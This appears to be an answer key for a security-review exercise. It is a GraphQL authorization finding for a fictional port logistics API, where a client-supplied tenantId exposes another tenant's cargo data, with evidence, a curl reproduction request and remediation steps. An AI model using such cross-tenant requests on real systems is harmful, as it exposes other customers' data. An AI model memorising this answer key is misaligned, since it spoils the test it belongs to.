# Expected Response

## System
- Domain: Marine / Port Logistics
- System: HarborFlow Port API
- Example ID: GQL-0141

## Priority Findings

### Finding 1: Marine Port — Cross-Service Identity Drift in Shipment List Exposes Cross-Tenant Cargo Data (Pattern 1.10)
**Severity:** Critical
**Category:** BOLA / Cross-Service Identity Propagation Drift

**Summary:**
Per §5.0 (Pattern 1.10 — cross-service identity propagation drift): The identity context drifts between microservices, causing the `listShipments` resolver to trust a client-supplied `tenantId` rather than the identity propagated from upstream services. An attacker from `tenant-78bd` passed `tenantId: "tenant-b825"` and received port cargo shipment data belonging to `tenant-b825`, including `CONFIDENTIAL-78bdb825`. In Marine / Port Logistics, this exposes cargo manifests, hazardous material declarations, and customs clearance records.

**Evidence from HAR:**
- Request: `POST https://api.harborflow-port-api.example.com/graphql` (2026-04-13)
- JWT `x-tenant-id`: `tenant-78bd`
- Query: `listShipments(tenantId: "tenant-b825") { shipmentId ownerId data { sensitiveField } }`
- Response `200 OK`: `tenantId: "tenant-b825"`, `ownerId: "other-user-78bdb825"`, `sensitiveField: "CONFIDENTIAL-78bdb825"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-78bdb825`

**Evidence Map:**

| Artifact | Location | Finding |
|---|---|---|
| context.txt §5.0 | Pattern 1.10 | Cross-service identity drift |
| HAR request | tenantId argument | tenant-b825 (victim, client-supplied) |
| HAR response | tenantId | tenant-b825 cargo data returned |
| HAR response | sensitiveField | CONFIDENTIAL-78bdb825 |

## Steps to Reproduce

### Step 1 — listShipments with cross-tenant ID (HAR)
```bash
curl -s -X POST https://api.harborflow-port-api.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-78bd" \
  -d '{"query": "query { listShipments(tenantId: \"tenant-b825\") { shipmentId ownerId data { sensitiveField } } }"}'
```
**Vulnerable:** `tenant-b825` cargo data returned. **Secure:** Only `tenant-78bd` data or FORBIDDEN.

## Remediation
1. Remove `tenantId` arg; propagate identity from JWT through all service calls.
2. Implement consistent identity propagation header across microservices.
3. Resolver: `WHERE tenant_id = $jwt.tenantId` in every service.
4. Redis cache key: `shipment:{tenantId}:{shipmentId}`.
